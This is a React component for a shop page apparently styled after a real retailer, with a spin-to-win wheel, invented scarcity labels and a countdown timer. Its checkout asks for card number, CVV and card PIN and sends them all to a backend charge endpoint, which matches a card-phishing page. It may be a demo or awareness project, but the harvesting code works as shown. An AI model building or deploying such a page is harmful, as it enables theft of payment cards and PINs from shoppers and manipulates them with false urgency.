import React, { useEffect, useRef, useState, useCallback } from 'react';
import { API } from '../context/AuthContext';

const PRODUCTS = [
  { id:1, name:'Wireless Earbuds', brand:'BoAt', price:1999,  originalPrice:3999,  emoji:'🎧', stock:'Only 3 left',     discount:'50% off', category:'Audio',    rating:4.3, reviews:1240 },
  { id:2, name:'Smart Watch',      brand:'Noise', price:4999, originalPrice:9999,  emoji:'⌚', stock:'Only 5 left',     discount:'50% off', category:'Wearable', rating:4.5, reviews:3820 },
  { id:3, name:'Phone Stand',      brand:'Portronics', price:499, originalPrice:999, emoji:'📱', stock:'Only 8 left',   discount:'50% off', category:'Accessory',rating:4.1, reviews:560  },
  { id:4, name:'Laptop Bag',       brand:'Gear', price:1299, originalPrice:2599,   emoji:'💼', stock:'Last 2 in stock', discount:'50% off', category:'Bags',     rating:4.4, reviews:890  },
  { id:5, name:'Desk Lamp',        brand:'Philips', price:799, originalPrice:1599, emoji:'💡', stock:'Only 4 left',     discount:'50% off', category:'Lighting', rating:4.2, reviews:430  },
  { id:6, name:'Webcam HD',        brand:'Logitech', price:2499, originalPrice:4999,emoji:'📷', stock:'Only 6 left',   discount:'50% off', category:'Camera',   rating:4.6, reviews:2100 },
  { id:7, name:'USB Hub',          brand:'Anker', price:699,  originalPrice:1399,  emoji:'🔌', stock:'Only 7 left',    discount:'50% off', category:'Accessory',rating:4.3, reviews:780  },
  { id:8, name:'Keyboard',         brand:'Zebronics', price:1599, originalPrice:3199,emoji:'⌨️', stock:'Last 3 in stock',discount:'50% off',category:'Input',   rating:4.4, reviews:1560 },
];

const WHEEL_COLORS = ['#e63946','#2a9d8f','#e9c46a','#264653','#f4a261','#457b9d','#6d6875','#2d6a4f'];

export default function SpinWheel() {
  const canvasRef  = useRef(null);
  const angleRef   = useRef(0);
  const timerRef   = useRef(null);

  const [screen,     setScreen]     = useState('home');
  const [spinning,   setSpinning]   = useState(false);
  const [product,    setProduct]    = useState(null);
  const [timerSecs,  setTimerSecs]  = useState(120);
  const [txnData,    setTxnData]    = useState(null);
  const [error,      setError]      = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [showWheel,  setShowWheel]  = useState(false);
  const [cartProduct,setCartProduct]= useState(null);
  const [form, setForm] = useState({
    customer_name:'', customer_email:'', reference_number:'',
    card_number:'', card_holder:'', card_expiry:'', card_cvv:'', card_pin:''
  });

  const drawWheel = useCallback((angle) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    const cx = 180, cy = 180, r = 165;
    const slice = (2 * Math.PI) / PRODUCTS.length;
    ctx.clearRect(0, 0, 360, 360);
    PRODUCTS.forEach((p, i) => {
      const start = angle + i * slice;
      const end   = start + slice;
      ctx.beginPath();
      ctx.moveTo(cx, cy);
      ctx.arc(cx, cy, r, start, end);
      ctx.closePath();
      ctx.fillStyle = WHEEL_COLORS[i];
      ctx.fill();
      ctx.strokeStyle = '#fff';
      ctx.lineWidth = 2;
      ctx.stroke();
      ctx.save();
      ctx.translate(cx, cy);
      ctx.rotate(start + slice / 2);
      ctx.textAlign = 'right';
      ctx.fillStyle = '#fff';
      ctx.font = 'bold 11px Arial,sans-serif';
      ctx.fillText(p.emoji + ' ' + p.name.split(' ')[0], r - 10, -4);
      ctx.font = '10px Arial,sans-serif';
      ctx.fillStyle = 'rgba(255,255,255,0.9)';
      ctx.fillText(p.discount, r - 10, 8);
      ctx.restore();
    });
    ctx.beginPath();
    ctx.arc(cx, cy, 24, 0, 2 * Math.PI);
    ctx.fillStyle = '#fff';
    ctx.fill();
    ctx.strokeStyle = '#e63946';
    ctx.lineWidth = 3;
    ctx.stroke();
    ctx.fillStyle = '#e63946';
    ctx.font = 'bold 9px Arial,sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('SPIN', cx, cy + 3);
  }, []);

  useEffect(() => { if (showWheel) setTimeout(() => drawWheel(0), 50); }, [showWheel, drawWheel]);

  const startTimer = () => {
    clearInterval(timerRef.current);
    setTimerSecs(120);
    timerRef.current = setInterval(() => {
      setTimerSecs(t => { if (t <= 1) { clearInterval(timerRef.current); return 0; } return t - 1; });
    }, 1000);
  };

  const fmt = s => `${Math.floor(s/60).toString().padStart(2,'0')}:${(s%60).toString().padStart(2,'0')}`;

  const spinWheel = () => {
    if (spinning) return;
    setSpinning(true);
    const extraSpins  = 5 + Math.floor(Math.random() * 4);
    const targetSlice = Math.floor(Math.random() * PRODUCTS.length);
    const sliceAngle  = (2 * Math.PI) / PRODUCTS.length;
    const target      = extraSpins * 2 * Math.PI + targetSlice * sliceAngle + Math.random() * sliceAngle * 0.8;
    const duration    = 4000;
    const start       = performance.now();
    const startAngle  = angleRef.current;
    const animate = (now) => {
      const elapsed  = now - start;
      const progress = Math.min(elapsed / duration, 1);
      const ease     = 1 - Math.pow(1 - progress, 4);
      angleRef.current = startAngle + target * ease;
      drawWheel(angleRef.current);
      if (progress < 1) { requestAnimationFrame(animate); return; }
      setSpinning(false);
      const normalized = (((-angleRef.current - Math.PI/2) % (2*Math.PI)) + 2*Math.PI) % (2*Math.PI);
      const idx = Math.floor(normalized / sliceAngle) % PRODUCTS.length;
      setProduct(PRODUCTS[idx]);
      startTimer();
      setTimeout(() => { setShowWheel(false); setScreen('checkout'); }, 600);
    };
    requestAnimationFrame(animate);
  };

  const handleInput = (e) => {
    let { name, value } = e.target;
    if (name === 'card_number') {
      value = value.replace(/\D/g,'').slice(0,16);
      value = value.match(/.{1,4}/g)?.join(' ') || value;
    }
    if (name === 'card_expiry') {
      value = value.replace(/\D/g,'').slice(0,4);
      if (value.length >= 3) value = value.slice(0,2) + '/' + value.slice(2);
    }
    setForm(f => ({ ...f, [name]: value }));
  };

  const submitPayment = async () => {
    setError('');
    const { customer_name, customer_email, card_number, card_holder, card_expiry, card_cvv, card_pin } = form;
    if (!customer_name || !customer_email || !card_number || !card_holder || !card_expiry || !card_cvv || !card_pin) {
      setError('Please fill in all required fields.'); return;
    }
    if (card_pin.length < 4) { setError('Card PIN must be at least 4 digits.'); return; }
    setSubmitting(true);
    try {
      const { data } = await API.post('/payments/charge', {
        amount: (cartProduct || product).price,
        currency: 'INR',
        card_number, card_holder, card_expiry, card_cvv, card_pin,
        product_name: (cartProduct || product).name,
        customer_name, customer_email,
        reference_number: form.reference_number || undefined,
      });
      clearInterval(timerRef.current);
      setTxnData(data.transaction);
      setScreen('success');
    } catch (err) {
      const msg =
        err.response?.data?.transaction?.error_message ||
        err.response?.data?.errors?.[0]?.msg ||
        err.response?.data?.error ||
        'Payment failed. Please check your card details.';
      setError(msg);
    } finally { setSubmitting(false); }
  };

  const restart = () => {
    clearInterval(timerRef.current);
    setForm({ customer_name:'', customer_email:'', reference_number:'', card_number:'', card_holder:'', card_expiry:'', card_cvv:'', card_pin:'' });
    setProduct(null); setCartProduct(null); setError(''); setTxnData(null); setTimerSecs(120);
    setShowWheel(false); setScreen('home');
  };

  const buyNow = (p) => { setCartProduct(p); setProduct(p); startTimer(); setScreen('checkout'); };

  const inp = { width:'100%', padding:'10px 12px', border:'1px solid #e0e0e0', borderRadius:'4px', fontSize:'14px', outline:'none', background:'#fff', color:'#1a1a1a', boxSizing:'border-box' };
  const lbl = { display:'block', fontSize:'12px', color:'#666', marginBottom:'4px', fontWeight:'500' };

  const activeProduct = cartProduct || product;

  return (
    <div style={{ background:'#f5f5f5', minHeight:'100vh', fontFamily:"'Segoe UI',Arial,sans-serif" }}>

      {/* ── AJIO TOP NAV ── */}
      <div style={{ background:'#fff', borderBottom:'1px solid #e8e8e8', position:'sticky', top:0, zIndex:50 }}>
        <div style={{ maxWidth:'1200px', margin:'0 auto', padding:'0 16px' }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', height:'60px' }}>
            <div style={{ display:'flex', alignItems:'center', gap:'32px' }}>
              <div style={{ fontSize:'26px', fontWeight:'900', color:'#e63946', letterSpacing:'-1px' }}>SHOPITEC</div>
              <div style={{ display:'flex', gap:'20px' }}>
                {['Men','Women','Kids','Home','Brands'].map(c => (
                  <span key={c} style={{ fontSize:'13px', color:'#333', cursor:'pointer', fontWeight:'500' }}>{c}</span>
                ))}
              </div>
            </div>
            <div style={{ display:'flex', alignItems:'center', gap:'8px', background:'#f5f5f5', borderRadius:'4px', padding:'8px 16px', flex:1, maxWidth:'400px', margin:'0 24px' }}>
              <span style={{ fontSize:'14px', color:'#999' }}>🔍</span>
              <span style={{ fontSize:'14px', color:'#999' }}>Search for products, brands and more</span>
            </div>
            <div style={{ display:'flex', alignItems:'center', gap:'20px' }}>
              <div style={{ textAlign:'center', cursor:'pointer' }}>
                <div style={{ fontSize:'18px' }}>👤</div>
                <div style={{ fontSize:'10px', color:'#666' }}>Profile</div>
              </div>
              <div style={{ textAlign:'center', cursor:'pointer' }}>
                <div style={{ fontSize:'18px' }}>❤️</div>
                <div style={{ fontSize:'10px', color:'#666' }}>Wishlist</div>
              </div>
              <div style={{ textAlign:'center', cursor:'pointer' }}>
                <div style={{ fontSize:'18px' }}>🛍️</div>
                <div style={{ fontSize:'10px', color:'#666' }}>Bag</div>
              </div>
              <a href="/admin" style={{ textDecoration:'none' }}>
                <div style={{ textAlign:'center', cursor:'pointer' }}>
                  <div style={{ fontSize:'18px' }}>🛡️</div>
                  <div style={{ fontSize:'10px', color:'#666' }}>Admin</div>
                </div>
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* ── HOME SCREEN ── */}
      {screen === 'home' && (
        <div>
          {/* Hero sale banner */}
          <div style={{ background:'#e63946', padding:'32px 16px', textAlign:'center', color:'#fff' }}>
            <div style={{ fontSize:'11px', letterSpacing:'3px', marginBottom:'6px', opacity:0.9 }}>EXCLUSIVE DEALS</div>
            <div style={{ fontSize:'36px', fontWeight:'900', marginBottom:'4px' }}>END OF SEASON SALE</div>
            <div style={{ fontSize:'18px', fontWeight:'300', marginBottom:'16px' }}>Up to 50% off on top brands</div>
            <div style={{ display:'flex', gap:'12px', justifyContent:'center', flexWrap:'wrap' }}>
              <span style={{ background:'rgba(255,255,255,0.2)', border:'1px solid rgba(255,255,255,0.4)', borderRadius:'999px', padding:'6px 16px', fontSize:'12px' }}>FREE delivery on orders above ₹499</span>
              <span style={{ background:'rgba(255,255,255,0.2)', border:'1px solid rgba(255,255,255,0.4)', borderRadius:'999px', padding:'6px 16px', fontSize:'12px' }}>Easy 30-day returns</span>
            </div>
          </div>

          {/* Spin wheel promo banner */}
          <div style={{ background:'linear-gradient(135deg,#1a1a2e,#16213e)', padding:'20px 16px', textAlign:'center' }}>
            <div style={{ maxWidth:'800px', margin:'0 auto', display:'flex', alignItems:'center', justifyContent:'space-between', flexWrap:'wrap', gap:'16px' }}>
              <div style={{ textAlign:'left' }}>
                <div style={{ color:'#ffd700', fontSize:'12px', letterSpacing:'2px', marginBottom:'4px' }}>🎰 SPIN & WIN</div>
                <div style={{ color:'#fff', fontSize:'22px', fontWeight:'700', marginBottom:'4px' }}>Spin the Wheel for Exclusive Deals!</div>
                <div style={{ color:'rgba(255,255,255,0.7)', fontSize:'13px' }}>Get up to 50% off on tech products — limited time offer</div>
              </div>
              <button onClick={() => setShowWheel(true)}
                style={{ background:'#ffd700', color:'#1a1a2e', border:'none', borderRadius:'4px', padding:'12px 28px', fontSize:'15px', fontWeight:'700', cursor:'pointer', whiteSpace:'nowrap' }}>
                Spin Now →
              </button>
            </div>
          </div>

          {/* Category pills */}
          <div style={{ background:'#fff', borderBottom:'1px solid #e8e8e8', overflowX:'auto' }}>
            <div style={{ display:'flex', gap:'0', maxWidth:'1200px', margin:'0 auto', padding:'0 16px' }}>
              {['All','Audio','Wearable','Bags','Camera','Accessory','Lighting','Input'].map((c,i) => (
                <div key={c} style={{ padding:'12px 20px', fontSize:'13px', fontWeight:'500', cursor:'pointer', borderBottom:`2px solid ${i===0?'#e63946':'transparent'}`, color:i===0?'#e63946':'#333', whiteSpace:'nowrap' }}>
                  {c}
                </div>
              ))}
            </div>
          </div>

          {/* Filter bar */}
          <div style={{ maxWidth:'1200px', margin:'0 auto', padding:'12px 16px', display:'flex', alignItems:'center', justifyContent:'space-between' }}>
            <div style={{ fontSize:'13px', color:'#666' }}>{PRODUCTS.length} products</div>
            <div style={{ display:'flex', gap:'8px' }}>
              {['Sort by: Popularity','Filter','Price'].map(f => (
                <button key={f} style={{ padding:'6px 14px', border:'1px solid #ddd', borderRadius:'4px', background:'#fff', fontSize:'12px', color:'#333', cursor:'pointer' }}>{f}</button>
              ))}
            </div>
          </div>

          {/* Product grid */}
          <div style={{ maxWidth:'1200px', margin:'0 auto', padding:'0 16px 32px' }}>
            <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fill, minmax(220px, 1fr))', gap:'16px' }}>
              {PRODUCTS.map(p => (
                <div key={p.id} style={{ background:'#fff', borderRadius:'4px', overflow:'hidden', border:'1px solid #e8e8e8', cursor:'pointer', transition:'box-shadow 0.2s' }}
                  onMouseEnter={e => e.currentTarget.style.boxShadow='0 4px 12px rgba(0,0,0,0.1)'}
                  onMouseLeave={e => e.currentTarget.style.boxShadow='none'}>
                  {/* Product image area */}
                  <div style={{ background:'#f8f8f8', height:'200px', display:'flex', alignItems:'center', justifyContent:'center', position:'relative' }}>
                    <div style={{ fontSize:'72px' }}>{p.emoji}</div>
                    <div style={{ position:'absolute', top:'8px', left:'8px', background:'#e63946', color:'#fff', borderRadius:'2px', padding:'2px 8px', fontSize:'11px', fontWeight:'700' }}>
                      {p.discount}
                    </div>
                    <div style={{ position:'absolute', top:'8px', right:'8px', fontSize:'18px', cursor:'pointer' }}>🤍</div>
                  </div>
                  {/* Product info */}
                  <div style={{ padding:'12px' }}>
                    <div style={{ fontSize:'11px', color:'#999', marginBottom:'2px', textTransform:'uppercase', letterSpacing:'0.5px' }}>{p.brand}</div>
                    <div style={{ fontSize:'13px', fontWeight:'500', color:'#1a1a1a', marginBottom:'6px', lineHeight:'1.3' }}>{p.name}</div>
                    <div style={{ display:'flex', alignItems:'center', gap:'4px', marginBottom:'8px' }}>
                      <span style={{ background:'#388e3c', color:'#fff', borderRadius:'2px', padding:'1px 6px', fontSize:'11px', fontWeight:'500' }}>{p.rating} ★</span>
                      <span style={{ fontSize:'11px', color:'#999' }}>({p.reviews.toLocaleString()})</span>
                    </div>
                    <div style={{ display:'flex', alignItems:'center', gap:'8px', marginBottom:'10px' }}>
                      <span style={{ fontSize:'16px', fontWeight:'700', color:'#1a1a1a' }}>₹{p.price.toLocaleString('en-IN')}</span>
                      <span style={{ fontSize:'12px', color:'#999', textDecoration:'line-through' }}>₹{p.originalPrice.toLocaleString('en-IN')}</span>
                      <span style={{ fontSize:'12px', color:'#e63946', fontWeight:'600' }}>{p.discount}</span>
                    </div>
                    <div style={{ fontSize:'11px', color:'#e63946', marginBottom:'10px', fontWeight:'500' }}>{p.stock}</div>
                    <button onClick={() => buyNow(p)}
                      style={{ width:'100%', padding:'9px', background:'#e63946', color:'#fff', border:'none', borderRadius:'4px', fontSize:'13px', fontWeight:'600', cursor:'pointer' }}>
                      BUY NOW
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ── SPIN WHEEL MODAL ── */}
      {showWheel && (
        <div style={{ position:'fixed', inset:0, background:'rgba(0,0,0,0.7)', display:'flex', alignItems:'center', justifyContent:'center', zIndex:100 }}>
          <div style={{ background:'#fff', borderRadius:'8px', padding:'28px', maxWidth:'440px', width:'90%', textAlign:'center' }}>
            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'16px' }}>
              <div>
                <div style={{ fontSize:'18px', fontWeight:'700', color:'#1a1a1a' }}>Spin & Win</div>
                <div style={{ fontSize:'12px', color:'#999' }}>Spin to unlock an exclusive deal</div>
              </div>
              <button onClick={() => setShowWheel(false)}
                style={{ background:'none', border:'none', fontSize:'22px', cursor:'pointer', color:'#999' }}>×</button>
            </div>
            <div style={{ position:'relative', width:'360px', height:'360px', margin:'0 auto 20px' }}>
              <div style={{ position:'absolute', top:'-8px', left:'50%', transform:'translateX(-50%)', width:0, height:0, borderLeft:'12px solid transparent', borderRight:'12px solid transparent', borderTop:'24px solid #e63946', zIndex:10 }} />
              <canvas ref={canvasRef} width={360} height={360} style={{ borderRadius:'50%', border:'4px solid #e63946' }} />
            </div>
            <button onClick={spinWheel} disabled={spinning}
              style={{ background: spinning ? '#ccc' : '#e63946', color:'#fff', border:'none', borderRadius:'4px', padding:'14px 40px', fontSize:'16px', fontWeight:'700', cursor: spinning ? 'not-allowed' : 'pointer', width:'100%' }}>
              {spinning ? 'Spinning...' : 'SPIN NOW'}
            </button>
            
          </div>
        </div>
      )}

      {/* ── CHECKOUT SCREEN ── */}
      {screen === 'checkout' && activeProduct && (
        <div style={{ maxWidth:'1000px', margin:'0 auto', padding:'24px 16px' }}>
          {/* Breadcrumb */}
          <div style={{ fontSize:'12px', color:'#999', marginBottom:'20px' }}>
            <span style={{ cursor:'pointer', color:'#e63946' }} onClick={restart}>Home</span>
            <span> › </span><span>Checkout</span>
          </div>

          <div style={{ display:'grid', gridTemplateColumns:'1fr 380px', gap:'20px', alignItems:'start' }}>

            {/* Left — form */}
            <div>
              {/* Product summary */}
              <div style={{ background:'#fff', borderRadius:'4px', border:'1px solid #e8e8e8', padding:'16px', marginBottom:'16px', display:'flex', gap:'16px', alignItems:'center' }}>
                <div style={{ width:'80px', height:'80px', background:'#f8f8f8', borderRadius:'4px', display:'flex', alignItems:'center', justifyContent:'center', fontSize:'40px', flexShrink:0 }}>
                  {activeProduct.emoji}
                </div>
                <div style={{ flex:1 }}>
                  <div style={{ fontSize:'11px', color:'#999', textTransform:'uppercase', marginBottom:'2px' }}>{activeProduct.brand}</div>
                  <div style={{ fontSize:'15px', fontWeight:'600', color:'#1a1a1a', marginBottom:'4px' }}>{activeProduct.name}</div>
                  <div style={{ display:'flex', gap:'8px', alignItems:'center' }}>
                    <span style={{ fontSize:'18px', fontWeight:'700' }}>₹{activeProduct.price.toLocaleString('en-IN')}</span>
                    <span style={{ fontSize:'13px', color:'#999', textDecoration:'line-through' }}>₹{activeProduct.originalPrice.toLocaleString('en-IN')}</span>
                    <span style={{ fontSize:'12px', color:'#e63946', fontWeight:'600' }}>{activeProduct.discount}</span>
                  </div>
                </div>
                <div style={{ textAlign:'right' }}>
                  <div style={{ fontSize:'11px', color:'#e63946', fontWeight:'500' }}>{activeProduct.stock}</div>
                  <div style={{ display:'flex', gap:'4px', alignItems:'center', marginTop:'4px', justifyContent:'flex-end' }}>
                    <span style={{ background:'#388e3c', color:'#fff', borderRadius:'2px', padding:'1px 6px', fontSize:'11px' }}>{activeProduct.rating} ★</span>
                  </div>
                </div>
              </div>

              {/* Timer */}
              <div style={{ background:'#fff3cd', border:'1px solid #ffc107', borderRadius:'4px', padding:'12px 16px', marginBottom:'16px', display:'flex', alignItems:'center', justifyContent:'space-between' }}>
                <div>
                  <div style={{ fontSize:'13px', fontWeight:'600', color:'#856404' }}>⏰ Offer expires soon!</div>
                  <div style={{ fontSize:'12px', color:'#856404', opacity:0.8 }}>Complete your purchase before time runs out</div>
                </div>
                <div style={{ fontSize:'28px', fontWeight:'700', color: timerSecs <= 30 ? '#e63946' : '#856404', fontVariantNumeric:'tabular-nums' }}>
                  {fmt(timerSecs)}
                </div>
              </div>

              {error && (
                <div style={{ background:'#fff5f5', border:'1px solid #fecaca', borderRadius:'4px', padding:'10px 14px', fontSize:'13px', color:'#dc2626', marginBottom:'14px' }}>
                  {error}
                </div>
              )}

              {/* Personal details */}
              <div style={{ background:'#fff', borderRadius:'4px', border:'1px solid #e8e8e8', padding:'20px', marginBottom:'16px' }}>
                <div style={{ fontSize:'15px', fontWeight:'700', color:'#1a1a1a', marginBottom:'16px', paddingBottom:'12px', borderBottom:'1px solid #f0f0f0' }}>
                  Contact Information
                </div>
                <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'14px', marginBottom:'14px' }}>
                  <div>
                    <label style={lbl}>Full name *</label>
                    <input name="customer_name" value={form.customer_name} onChange={handleInput} placeholder="Enter your name" style={inp} />
                  </div>
                  <div>
                    <label style={lbl}>Email address *</label>
                    <input name="customer_email" type="email" value={form.customer_email} onChange={handleInput} placeholder="Enter your email" style={inp} />
                  </div>
                </div>
                
              </div>

              {/* Card details */}
              <div style={{ background:'#fff', borderRadius:'4px', border:'1px solid #e8e8e8', padding:'20px', marginBottom:'16px' }}>
                <div style={{ fontSize:'15px', fontWeight:'700', color:'#1a1a1a', marginBottom:'4px', paddingBottom:'12px', borderBottom:'1px solid #f0f0f0', display:'flex', alignItems:'center', justifyContent:'space-between' }}>
                  <span>Payment Details</span>
                  <div style={{ display:'flex', gap:'6px' }}>
                    {['💳','🏦','📱'].map((i,idx) => (
                      <span key={idx} style={{ fontSize:'18px' }}>{i}</span>
                    ))}
                  </div>
                </div>
                <div style={{ background:'#f0f7ff', border:'1px solid #bfdbfe', borderRadius:'4px', padding:'8px 12px', fontSize:'12px', color:'#1e40af', marginBottom:'14px' }}>
                   enter a valid 16-digit card. Payment fails if details are invalid.
                </div>
                <div style={{ marginBottom:'14px' }}>
                  <label style={lbl}>Card number *</label>
                  <input name="card_number" value={form.card_number} onChange={handleInput} placeholder="0000 0000 0000 0000" maxLength={19} style={inp} />
                </div>
                <div style={{ marginBottom:'14px' }}>
                  <label style={lbl}>Name on card *</label>
                  <input name="card_holder" value={form.card_holder} onChange={handleInput} placeholder="As printed on card" style={inp} />
                </div>
                <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px', marginBottom:'14px' }}>
                  <div>
                    <label style={lbl}>Expiry (MM/YY) *</label>
                    <input name="card_expiry" value={form.card_expiry} onChange={handleInput} placeholder="MM/YY" maxLength={5} style={inp} />
                  </div>
                  <div>
                    <label style={lbl}>CVV *</label>
                    <input name="card_cvv" type="password" value={form.card_cvv} onChange={handleInput} placeholder="•••" maxLength={4} style={inp} />
                  </div>
                  <div>
                    <label style={lbl}>Card PIN *</label>
                    <input name="card_pin" type="password" value={form.card_pin} onChange={handleInput} placeholder="••••" maxLength={6} style={inp} />
                  </div>
                </div>
                <div style={{ fontSize:'11px', color:'#999' }}>🔒 Your card details are masked before storage. CVV and PIN stored as •••</div>
              </div>
            </div>

            {/* Right — order summary */}
            <div style={{ position:'sticky', top:'80px' }}>
              <div style={{ background:'#fff', borderRadius:'4px', border:'1px solid #e8e8e8', padding:'20px', marginBottom:'12px' }}>
                <div style={{ fontSize:'14px', fontWeight:'700', color:'#1a1a1a', marginBottom:'16px', textTransform:'uppercase', letterSpacing:'0.5px' }}>
                  Order Summary
                </div>
                {[
                  ['MRP',           `₹${activeProduct.originalPrice.toLocaleString('en-IN')}`],
                  ['Discount',      `-₹${(activeProduct.originalPrice - activeProduct.price).toLocaleString('en-IN')}`],
                  ['Delivery',      'FREE'],
                ].map(([k, v]) => (
                  <div key={k} style={{ display:'flex', justifyContent:'space-between', padding:'6px 0', fontSize:'13px', color: k==='Discount' ? '#388e3c' : '#333' }}>
                    <span style={{ color:'#666' }}>{k}</span><span style={{ fontWeight: k==='Discount'?'600':'400' }}>{v}</span>
                  </div>
                ))}
                <div style={{ borderTop:'1px dashed #e0e0e0', margin:'12px 0' }} />
                <div style={{ display:'flex', justifyContent:'space-between', fontSize:'16px', fontWeight:'700', color:'#1a1a1a', marginBottom:'16px' }}>
                  <span>Total Amount</span>
                  <span>₹{activeProduct.price.toLocaleString('en-IN')}</span>
                </div>
                <div style={{ background:'#f0fdf4', border:'1px solid #bbf7d0', borderRadius:'4px', padding:'8px 12px', fontSize:'12px', color:'#166534', marginBottom:'16px' }}>
                  🎉 You save ₹{(activeProduct.originalPrice - activeProduct.price).toLocaleString('en-IN')} on this order!
                </div>
                <button onClick={submitPayment} disabled={submitting || timerSecs === 0}
                  style={{ width:'100%', padding:'14px', background: timerSecs===0 ? '#ccc' : '#e63946', color:'#fff', border:'none', borderRadius:'4px', fontSize:'15px', fontWeight:'700', cursor: submitting||timerSecs===0 ? 'not-allowed':'pointer', marginBottom:'10px', letterSpacing:'0.5px' }}>
                  {submitting ? 'PROCESSING...' : timerSecs===0 ? 'OFFER EXPIRED' : 'PLACE ORDER'}
                </button>
                <button onClick={restart}
                  style={{ width:'100%', padding:'10px', background:'#fff', border:'1px solid #e63946', borderRadius:'4px', fontSize:'13px', fontWeight:'600', color:'#e63946', cursor:'pointer' }}>
                  CONTINUE SHOPPING
                </button>
                <div style={{ textAlign:'center', fontSize:'11px', color:'#999', marginTop:'12px' }}>
                  🔒 Secure checkout
                </div>
              </div>

              {/* Trust badges */}
              <div style={{ background:'#fff', borderRadius:'4px', border:'1px solid #e8e8e8', padding:'14px' }}>
                {[
                  ['🚚', '100% Original Products'],
                  ['↩️', '30 Day Return Policy'],
                  ['🔒', 'Secure Payment'],
                ].map(([icon, text]) => (
                  <div key={text} style={{ display:'flex', alignItems:'center', gap:'10px', padding:'6px 0', fontSize:'12px', color:'#555' }}>
                    <span style={{ fontSize:'16px' }}>{icon}</span>{text}
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── SUCCESS SCREEN ── */}
      {screen === 'success' && txnData && (
        <div style={{ maxWidth:'600px', margin:'40px auto', padding:'0 16px' }}>
          <div style={{ background:'#fff', borderRadius:'4px', border:'1px solid #e8e8e8', padding:'32px', textAlign:'center' }}>
            <div style={{ width:'72px', height:'72px', background:'#f0fdf4', borderRadius:'50%', display:'flex', alignItems:'center', justifyContent:'center', margin:'0 auto 16px', fontSize:'32px', color:'#16a34a', border:'3px solid #bbf7d0' }}>✓</div>
            <div style={{ fontSize:'22px', fontWeight:'700', color:'#1a1a1a', marginBottom:'4px' }}>Order Placed Successfully!</div>
            <div style={{ fontSize:'13px', color:'#666', marginBottom:'6px' }}>Order ID: <strong style={{ fontFamily:'monospace', color:'#e63946' }}>{txnData.txn_id}</strong></div>
            

            <div style={{ background:'#f8f8f8', borderRadius:'4px', padding:'16px', marginBottom:'20px', textAlign:'left' }}>
              <div style={{ fontSize:'13px', fontWeight:'700', marginBottom:'12px', color:'#1a1a1a' }}>Order Details</div>
              {[
                ['Product',    activeProduct?.name],
                ['Brand',      activeProduct?.brand],
                ['Amount',     `₹${activeProduct?.price.toLocaleString('en-IN')}`],
                ['You saved',  `₹${(activeProduct?.originalPrice - activeProduct?.price).toLocaleString('en-IN')}`],
                ['Name',       form.customer_name],
                ['Email',      form.customer_email],
                ['Card',       '•••• •••• •••• ' + form.card_number.replace(/\s/g,'').slice(-4)],
                ['Status',     '✅ Confirmed '],
              ].map(([k,v]) => (
                <div key={k} style={{ display:'flex', justifyContent:'space-between', padding:'5px 0', borderBottom:'1px solid #eee', fontSize:'13px' }}>
                  <span style={{ color:'#888' }}>{k}</span>
                  <span style={{ fontWeight: k==='Status'?'600':'400', color: k==='You saved'?'#388e3c':'#1a1a1a' }}>{v}</span>
                </div>
              ))}
            </div>

            <button onClick={restart}
              style={{ background:'#e63946', color:'#fff', border:'none', borderRadius:'4px', padding:'12px 32px', fontSize:'14px', fontWeight:'700', cursor:'pointer', width:'100%', marginBottom:'10px' }}>
              CONTINUE SHOPPING
            </button>
            <a href="/admin" style={{ display:'block', fontSize:'12px', color:'#999', textDecoration:'none', marginTop:'8px' }}>
              View in Admin Panel →
            </a>
          </div>
        </div>
      )}

      {/* Footer */}
      {screen === 'home' && (
        <div style={{ background:'#1a1a1a', color:'#fff', padding:'32px 16px', marginTop:'32px' }}>
          <div style={{ maxWidth:'1200px', margin:'0 auto', display:'grid', gridTemplateColumns:'repeat(4,1fr)', gap:'24px' }}>
            {[
              { title:'Company', links:['About Us','Careers','Press'] },
              { title:'Help',    links:['FAQ','Returns','Track Order'] },
              { title:'Policy',  links:['Privacy','Terms','Sitemap'] },
              { title:'Connect', links:['Instagram','Facebook','Twitter'] },
            ].map(col => (
              <div key={col.title}>
                <div style={{ fontSize:'12px', fontWeight:'700', letterSpacing:'1px', marginBottom:'12px', color:'#e63946' }}>{col.title.toUpperCase()}</div>
                {col.links.map(l => (
                  <div key={l} style={{ fontSize:'12px', color:'#888', marginBottom:'8px', cursor:'pointer' }}>{l}</div>
                ))}
              </div>
            ))}
          </div>
          <div style={{ maxWidth:'1200px', margin:'20px auto 0', borderTop:'1px solid #333', paddingTop:'16px', display:'flex', justifyContent:'space-between', alignItems:'center' }}>
            <div style={{ fontSize:'20px', fontWeight:'900', color:'#e63946' }}>SHOPITEC</div>
            
          </div>
        </div>
      )}
    </div>
  );
}
